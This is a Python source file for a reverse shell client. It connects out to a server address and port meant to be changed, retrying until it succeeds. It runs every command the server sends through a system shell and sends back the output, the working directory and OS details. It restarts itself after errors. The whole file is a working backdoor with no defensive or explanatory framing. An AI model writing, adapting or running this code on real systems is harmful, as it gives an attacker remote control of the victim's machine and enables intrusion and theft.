import os
import subprocess
import socket
import time
import platform


def SocketCreate():
	try:
		global Host
		global Port
		global Socket

		Host = '127.0.0.1'  # To Be Changed!!!
		Port = 9999
		Socket = socket.socket()

	except socket.error as msg:
		print("Socket Creation Error: " + str(msg))


def SocketConnect():
	try:
		global Host
		global Port
		global Socket

		Socket.connect((Host, Port))
	except socket.error as msg:
		print("Socket Connection Error: " + str(msg))
		time.sleep(5)
		SocketConnect()


def ReceiveCommands():
	while True:
		# Data Received From Server
		Data = Socket.recv(20480)

		# Display Command Received From Server
		print("Command Received : " + Data[:].decode('utf-8') + '\n')

		# When Receiving a 'CD' Command, then
		if Data[:2].decode('utf-8') == 'cd':
			try:
				# Change Directory
				os.chdir(Data[3:].decode("utf-8"))
			except:
				pass

		if Data[:].decode("utf-8") == "quit":
			Socket.close()
			break

		# When Receiving Any Other Command, then
		if len(Data) > 0:
			try:

				# Open a Process and Take in the Command (Data) and Show the Terminal (shell = True) and
				# Push All the Data to the Standard Stream.
				CMD = subprocess.Popen(Data[:].decode('utf-8'), shell = True, stdout = subprocess.PIPE,
				                       stderr = subprocess.PIPE, stdin = subprocess.PIPE)

				# Output Bytes Format
				outputBytes = CMD.stdout.read() + CMD.stderr.read()
				# Output String
				outputString = str(outputBytes, encoding = 'utf-8', errors = 'ignore')

				if "is not recognized as an internal or external command" in outputString:
					outputString = outputString + "\nOS Information:\n\tSystem : " + platform.system() + ", Release : " + \
					               platform.release() + ", Version : " + platform.version() + "\n\n" + \
					               str(os.getcwd()) + '> '

					Socket.send(str.encode(outputString))

				elif "not found" in outputString:
					outputString = outputString + "\nOS Information:\n\tSystem : " + platform.system() + ", Release : " + \
					               platform.release() + ", Version : " + platform.version() + "\n\n" + \
					               str(os.getcwd()) + '> '

					Socket.send(str.encode(outputString))

				else:
					# Send Current Results to the Server + Current Working Directory
					Socket.send(str.encode(outputString + str(os.getcwd()) + '> '))

				# Print out Results on Client
				print("Displaying Results:")
				print(outputString)

			except:
				outputString = "Command Not Recognized" + "\n"
				Socket.send(str.encode(outputString + str(os.getcwd()) + "windows> "))
				print(outputString)


def main():
	global Socket
	try:
		SocketCreate()
		SocketConnect()
		ReceiveCommands()
	except:
		print("Error in Main")
		time.sleep(5)
	Socket.close()
	main()


main()
